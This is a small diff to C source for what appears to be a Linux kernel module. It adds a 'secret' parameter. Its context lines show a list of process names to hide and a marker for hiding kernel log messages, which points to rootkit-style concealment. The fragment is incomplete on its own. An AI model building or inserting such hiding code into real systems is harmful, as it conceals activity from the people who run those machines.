@@ -122,6 +122,10 @@ static int num_proc_name = 3;
 static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {KHTREAD_PROC_NAME, "hidden_comm", "touch", "rm"};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 
+/* secret */
+static char *secret = "hidden_proc";
+module_param(secret, charp, 0644);
+
 static char hidden_msg_klog[] = "hidden_proc";
 static char **p_log_buf = NULL;
 static raw_spinlock_t *p_logbuf_lock = NULL;
